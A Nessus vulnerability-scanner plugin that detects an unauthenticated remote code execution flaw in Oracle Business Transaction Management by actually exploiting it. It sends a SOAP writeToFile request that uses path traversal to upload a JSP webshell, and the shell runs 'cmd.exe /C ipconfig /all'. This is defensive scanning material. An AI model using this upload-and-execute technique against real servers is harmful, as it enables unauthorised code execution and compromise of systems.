#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(78776);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_bugtraq_id(54839);
  script_osvdb_id(85087);
  script_xref(name:"EDB-ID", value:"20318");

  script_name(english:"Oracle Business Transaction Management 'FlashTunnelService' 'WriteToFile' Message RCE");
  script_summary(english:"Creates a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a Java web application that is affected by
a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of Oracle Business
Transaction Management that is affected by a remote code execution
vulnerability. The 'FlashTunnelService' web service does not require
authentication and exposes the 'WriteToFile' function, which can allow
a remote, unauthenticated attacker to write an arbitrary file
containing arbitrary code to the remote host.

Note that the 'deleteFile' function is also exposed and can be used to
delete arbitrary files; however, Nessus has not tested for this issue.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/523800");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-12-529");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Oracle Business Transaction Management Server 12.1.0.2.7 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Oracle Business Transaction Management FlashTunnelService Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/10/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:oracle:business_transaction_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("oracle_business_transaction_management_detect.nbin", "os_fingerprint.nasl");
  script_require_ports("Services/www", 7001);
  script_require_keys("installed_sw/Oracle Business Transaction Management");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'Oracle Business Transaction Management';
port = get_http_port(default:7001);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install["path"];
install_url = build_url(port:port, qs:dir);

if (report_paranoia < 2)
{
  os = get_kb_item_or_exit("Host/OS");
  if ("Windows" >!< os) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}

# Payload to use in our uploaded file
attack_payload =
  '&lt;%@ page import=&quot;java.io.*&quot; %&gt;\n' +
  '&lt;%\n' +
  'String output = &quot;&quot;;\n' +
  'String s = null;\n' +
  '  try {\n' +
  '     Process p = Runtime.getRuntime().exec(&quot;cmd.exe /C ipconfig /all' +
  '&quot;);\n' +
  '     BufferedReader sI = new BufferedReader(new InputStreamReader(p.get' +
  'InputStream()));\n' +
  '       while((s = sI.readLine()) != null) {\n' +
  '         output += s + "\\n";\n' +
  '       }\n' +
  '    }\n' +
  '    catch(IOException e) {\n' +
  '       e.printStackTrace();\n' +
  '    }\n' +
  '%&gt;\n' +
  '&lt;%=output %&gt;';

traversal =  '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\';
dir_paths = make_list('weblogic92', 'wlserver_10.0', 'wlserver_10.3', 'wlserver_12.1');
paths = make_list(
  '\\server\\lib\\consoleapp\\webapp\\images\\',
  '\\samples\\server\\examples\\build\\mainWebApp\\'
);

headers = make_array(
  "Content-Type", "text/xml;charset=UTF-8",
  "SOAPAction", '"http://soa.amberpoint.com/writeToFile"'
);

vuln = FALSE;
time = unixtime();
upfile = SCRIPT_NAME - ".nasl" + "-";

foreach dir_path (dir_paths)
{
  foreach path (paths)
  {
    file = upfile + time;
    attack_path = traversal + dir_path + path + file + ".jsp";

    postdata =
      '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/' +
      'envelope/"'+
      ' xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" ' +
      'xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">\n' +
      ' <soapenv:Header/>\n' +
      ' <soapenv:Body>\n' +
      '    <int:writeToFileRequest>\n' +
      '       <int:writeToFile handle="' + attack_path + '">\n' +
      '          <!--Zero or more repetitions:-->\n' +
      '          <typ:text>' + attack_payload + '\n' +
      '          </typ:text>\n' +
      '          <!--Optional:-->\n' +
      '          <typ:WriteToFileRequestVersion>\n' +
      '             <!--You may enter ANY elements at this point-->\n' +
      '          </typ:WriteToFileRequestVersion>\n' +
      '       </int:writeToFile>\n' +
      '    </int:writeToFileRequest>\n' +
      ' </soapenv:Body>\n' +
      '</soapenv:Envelope>';

    res = http_send_recv3(
      port         : port,
      method       : "POST",
      item         : "/btmui/soa/flash_svc/",
      data         : postdata,
      add_headers  : headers,
      exit_on_fail : TRUE
    );
    exp_request = http_last_sent_request();

    if ("pfx2:WriteToFileResponse" >< res[2])
    {
      if ("build\mainWebApp" >< attack_path)
        url = "/" + file + ".jsp";
      else
        url = "/console/images/" + file + ".jsp";

      # Try and access our uploaded file
      res2 = http_send_recv3(
        method : "GET",
        port   : port,
        item   : url,
        exit_on_fail : TRUE
      );
      if ("Subnet Mask" >< res2[2])
      {
        vuln = TRUE;
        verify_request = install_url - "/btmui" + url;
        # Format output for reporting
        output = substr(res2[2], stridx(res2[2], "Windows IP Config"));
        if (empty_or_null(output)) output = res2[2];
        break;
      }
    }
    time +=1;
  }
  if (vuln) break;
  time +=1;
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  cmd        : "ipconfig /all",
  line_limit : 11,
  request    : make_list(exp_request, verify_request),
  output     : chomp(output),
  rep_extra  : '\n'+'Note : The file created by this plugin has not been removed by Nessus' +
               '\n'+'and will need to be manually removed.'
);
